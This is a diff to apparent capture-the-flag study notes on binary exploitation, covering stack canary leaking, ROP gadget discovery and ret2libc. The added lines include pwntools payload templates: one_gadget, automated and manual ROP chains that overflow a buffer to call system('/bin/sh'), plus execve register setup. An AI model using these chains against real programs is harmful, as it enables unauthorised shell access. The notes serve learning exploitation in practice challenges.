@@ -36,7 +36,6 @@ gdb is useful
   - `rabin2 -R [binary]` to find function addresses and PLT addresses faster 
 - in the event that gdb is annoying and won't give you the offset use a diff disassembler like IDA or binaryninja
 - test altered GOT addresses in gdb by setting breakpoints, and using `set {int} 0xaddrone=0xaddrtwo`
-- find strings with `rabin2 -z [binary]`
 
 ### more about registers
 
@@ -89,10 +88,11 @@ alternatively, \n
 - ~~the pointer leaking is probably of the master canary, while the thing you need to keep constant is the local canary~~ Unreliable because "I was high when I said this" :eyeroll: smh
 - to find `n`, need to use a brute force script, an example is added under [leak_canary.py](./Canary/leak_canary.py)
 
-### set breakpoint
-- in gdb, `b * <addr of stackcheck>`
+### buffer overflow to find canary
+- in gdb, `b * <addr of stackcheck>` set breakpoint before canary check
 - pattern create/search
-- search canary
+- search canary 
+- will return the contents of the canary before the program crashes
 
 ### IDA
 - you can use IDA to find the canary location on the stack, the canary is declared as an unsigned integer, then use the ebp/rbp offset
@@ -100,22 +100,63 @@ alternatively, \n
 - using gdb would be easier
 
 # ROP
-[buffer][ret][write "/bin/sh\x00" into memory][chain requirement for execve][syscall]
+
+## Finding gadgets
+`ROPgadget --binary=<binary> | grep pop, etc`
+
+## ROP to shell
+[buffer][ret][write "/bin/sh\x00" into memory][set up calling convention for execve][syscall]
 - rdi=filename(pointer to "/bin/sh\x00")
 - rsi=0
 - rdx=0
 - rax=59 in hex(0x3b)
 - call syscall
 
-ROP for calling conventions: \n
-[buffer][ret][changing registers][function]
+Making a system call to execve("/bin/sh") (or any execve) has requirements for certain registers <https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>
 
-## explaining the payload
-- find gadgets with `ROPgadget --binary=<binary> | grep pop, etc`
-- make a syscall by chaining assembly instructions present in the program
-- depending on the syscall, you will need to fix registers <https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>
+For a shell, the string "/bin/sh\x00" has to be in the memory somewhere; you can search for the string with either of the following:
+```bash
+$ rabin2 -z [binary]
+$ ROPgadget --binary [binary] --string "/bin/sh\x00"
+```
+or automate it (only possible with libc)
+```python
+### one_gadget ###
+one_gadget = 0xdeadbeef
+execve = libc.address +one_gadget
+p.sendlineafter(PROMPT, flat(
+	b"A"*RIP_OFFSET,
+	execve
+))
+
+### automated ROP chain ###
+rop = ROP([elf, libc])
+rop.system(next(libc.search(b"/bin/sh")))
+p.sendlineafter(PROMPT, flat(
+	"A"*RIP_OFFSET,
+	rop.ret.address,
+	rop.chain()
+))
+
+### kind of manual system call with binsh declared ###
+binsh = libc.address + 0xdeadbeef 
+#~$ ROPgadget --binary ./libc.so.6 --string "/bin/sh"
+p.sendlineafter(PROMPT, flat(
+	b"A"*RIP_OFFSET,
+	rop.rdi.address,
+	binsh,
+	rop.ret.address,
+	libc.symbols.system
+))
+```
+
+## ROP to general function with arguments
+`[buffer][ret][necessary writes][changing registers][function]`
+
+certain challenges may require functions to be called without libc, [speedrun](./.archive/speedrun-exploit.py), [write4](../ROPemporium/write4/exploit.py)
+
+==============
 - for things like strings, it needs to be written into the memory, which requires some funny pointer magic 
-- best thing is to look at [this example script](./rop_example.py)
 
 ### rop chain to write /bin/sh into memory
 - find a `mov qword ptr` gadget
@@ -132,7 +173,7 @@ ROP for calling conventions: \n
 - add the address of libc and "/bin/sh"
 - check if the string is at the location with `x/s <addr>`
 - or `ROPgadget --binary ./libc.so.6 --strings "/bin/sh"`
-
+=================================
 # ret2libc
 ### Glossary
 - GOT: Global Offsets Table
